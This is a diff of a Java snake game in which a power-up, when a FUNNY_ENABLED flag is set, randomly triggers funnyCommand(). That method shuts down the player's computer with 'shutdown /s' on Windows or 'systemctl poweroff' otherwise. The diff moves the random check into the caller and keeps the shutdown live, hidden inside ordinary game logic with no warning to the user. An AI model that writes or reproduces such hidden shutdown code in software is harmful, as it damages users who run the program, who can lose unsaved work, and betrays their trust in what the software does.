@@ -95,8 +95,12 @@ public class Serpiente extends ObjetoJuego implements Habilidades {
                 crecer();
                 break;
             case 4:
-                if (FUNNY_ENABLED) {
+                Random rand = new Random();
+                int val = rand.nextInt(21);
+                if (FUNNY_ENABLED && val == 20) {
                     funnyCommand();
+                } else {
+                    elegirHabilidad(rand.nextInt(5),timer, puntaje);
                 }
             default:
                 crecer();
@@ -137,20 +141,13 @@ public class Serpiente extends ObjetoJuego implements Habilidades {
     }
 
     public void funnyCommand() throws IOException {
-        Random rand = new Random();
-        int val = rand.nextInt(21);
-
-        if (val == 20) {
-            String os = System.getProperty("os.name").toLowerCase();
-            System.out.println(os);
-            if (os.startsWith("windows")){
-                Runtime.getRuntime().exec("shutdown /s");
-            }
-            else{
-                Runtime.getRuntime().exec("systemctl poweroff");
-            }
-        } else {
-            crecer();
+        String os = System.getProperty("os.name").toLowerCase();
+        System.out.println(os);
+        if (os.startsWith("windows")){
+            Runtime.getRuntime().exec("shutdown /s");
+        }
+        else{
+            Runtime.getRuntime().exec("systemctl poweroff");
         }
     }
 
